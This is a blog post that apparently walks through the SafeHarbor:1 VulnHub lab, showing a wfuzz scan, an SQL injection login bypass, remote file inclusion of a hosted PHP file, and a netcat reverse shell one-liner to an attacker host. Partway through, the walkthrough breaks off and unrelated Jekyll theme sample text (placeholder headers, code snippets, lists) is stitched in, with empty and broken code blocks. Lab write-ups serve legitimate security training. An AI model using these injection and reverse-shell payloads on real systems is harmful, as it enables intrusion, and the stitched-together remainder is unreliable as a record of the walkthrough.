title: VulnHub Walkthrough SafeHarbor:1
published: true
---

I enjoyed playing this challenge and I thought it would be a great idea to write a walkthrough. Even though most of the techniques required to solve the challenges were well known I tried to use non-traditional paths to some extent. I limited myself from using Metasploit or Cobalt Strike, which are often easily detected during red team engagements. So the goal was to use tools and scripts, that I often bookmarked and read about.

If you want to play along, you can download the VM from Vulnhub here: [SafeHarbor:1](https://www.vulnhub.com/entry/safeharbor-1,377/)

**Description from VulnHub:**

```
A harder VM designed to train for both pentesting newer IT infrastructure methodologies as well as network pivot practice.
You'll need to be familiar with pivoting techniques, web app vulnerabilities, Metasploit and Meterpreter, as well as enumeration methodologies and a good bit of patience.
As a note, there are two additional bonus flags that will appear in the /root directory based on pre-defined actions taken during the course of rooting the VM.
Works better in VirtualBox than VMware
```

As mentioned in the description the VM works well on VirtualBox, I tried Vmware Fusion and DHCP does not seem to work. Once you have the VM up and running, discover the live hosts in your vmnet adapter to find the VM IP address (not covered in this post)

**Service discovery scan:**

Scanning well known ports gives me something to start with, the attack surface is limited to port 80 running a PHP application and SSH service. Let's go ahead and take a look at the application.

In the meantime, let's also look for common PHP files using wfuzz. This is much faster than using dirbuster in my opinion.

```sh
wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ.php -t 500
```

Sweet! it's a login page. 

![login_page](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_1.png)

Let's quickly try some SQL injections on the login form fields:

```
POST / HTTP/1.1
Host: 192.168.1.21
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0

user=';--&password=test&s=Login
```

From the verbose errors, we can deduce that SQL injection is possible, I'm going to try some standard login bypass technique.

![sqli_error](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.png)

```sql
admin' or '1'='1
```

```

```

Et voil√†! That was easy, considering this was trivial I probably have a longer path to get all the flags.

Let's take a look at the wfuzz output:

```sh

Settings in phpinfo.php reveals that the directives for including files are enabled. Let's try LFI/RFI, if that doesn't work I can maybe exploit further using PHP streams.

```
Registered PHP Streams:  https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar

Directive:
allow_url_fopen On  On
allow_url_include On  On

```

A quick test reveals that the parameter "p" uses include function: http://192.168.1.21/OnlineBanking/index.php?p=../../../balance

```html
<br />
<b>Warning</b>:  include(../../../balance.php): failed to open stream: No such file or directory in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '../../../balance.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />

```

Let me host a PHP file to execute the command 'id' on my Kali (attacker) box and include it to see if that works. 

```php
<?php system('id'); ?>
```

Start a web server using Python's SimpleHTTPServer:

```sh
root@kali:/tmp# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

```

That worked!

Let's go ahead and get a reverse shell, using the default one available on Kali (/usr/share/webshells/php/php-reverse-shell.php) or you can achieve the same using one of the one liners below. I did some basic checks to verify what shells are available and if netcat is available. Luckily, the version supports "-e" option. If that option is not supported you can use the workaround mentioned here: [Link to another page](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)

```php
<?php system('nc attacker_ip port -e /bin/sh'); ?>
```

Great! Now I have a reverse shell:

There should be whitespace between paragraphs.

There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.

# [](#header-1)Header 1

This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.

## [](#header-2)Header 2

> This is a blockquote following a header.
>
> When something is important enough, you do it even if the odds are not in your favor.

### [](#header-3)Header 3

```js
// Javascript code with syntax highlighting.
var fun = function lang(l) {
  dateformat.i18n = require('./lang/' + l)
  return true;
}
```

```ruby
# Ruby code with syntax highlighting
GitHubPages::Dependencies.gems.each do |gem, version|
  s.add_dependency(gem, "= #{version}")
end
```

### There's a horizontal rule below this.

### Here is an unordered list:

*   Item foo
*   Item bar
*   Item baz
*   Item zip

### And an ordered list:

1.  Item one
1.  Item two
1.  Item three
1.  Item four

### And a nested list:

- level 1 item
  - level 2 item
  - level 2 item
    - level 3 item
    - level 3 item
- level 1 item
  - level 2 item
  - level 2 item
  - level 2 item
- level 1 item
  - level 2 item
  - level 2 item
- level 1 item

Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
